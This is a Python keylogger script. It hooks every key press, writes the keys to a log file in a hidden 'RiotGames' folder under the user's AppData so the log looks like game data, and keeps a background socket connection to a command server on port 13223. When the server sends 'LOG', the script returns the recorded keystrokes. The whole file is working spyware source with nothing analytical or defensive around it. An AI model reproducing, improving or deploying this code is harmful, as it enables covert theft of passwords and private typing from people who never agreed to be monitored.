import socket
import keyboard
import subprocess
from pathlib import Path
import threading

# Path to the log file
log_folder = Path.home() / "AppData" / "Roaming" / "RiotGames"
log_folder.mkdir(parents=True, exist_ok=True)
subprocess.run(["attrib", "+h", str(log_folder)])

log_file = log_folder / "log.txt"

# Function to log key presses to the log.txt file
def on_key_press(event):
    with log_file.open("a") as f:
        f.write(f"{event.name}")

# Function to handle socket communication
def handle_socket():
    HOST = ""  
    PORT = 13223
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            print("Connected to server.")

            while True:
                try:
                    # Wait for a command from the server
                    data = s.recv(4096)
                    if not data:
                        print("Connection closed by server.")
                        break

                    command = data.decode("utf-8").strip()
                    print(f"Server says: {command}")

                    # Handle server commands here
                    if command.upper() == "LOG":
                        try:
                            with log_file.open("r") as f:
                                log_data = f.read()
                            s.sendall(log_data.encode("utf-8"))
                            print("Sent log data to server.")
                        except Exception as e:
                            print(f"Error reading log file: {e}")

                    elif command.lower() == 'exit':
                        print("Server requested to close the connection.")
                        break

                except Exception as e:
                    print(f"Error during communication: {e}")
                    break

    except Exception as e:
        print(f"Failed to connect to server: {e}")

# Start a new thread to handle socket communication
socket_thread = threading.Thread(target=handle_socket)
socket_thread.daemon = True
socket_thread.start()

# Start listening to key presses
keyboard.on_press(on_key_press)
keyboard.wait()
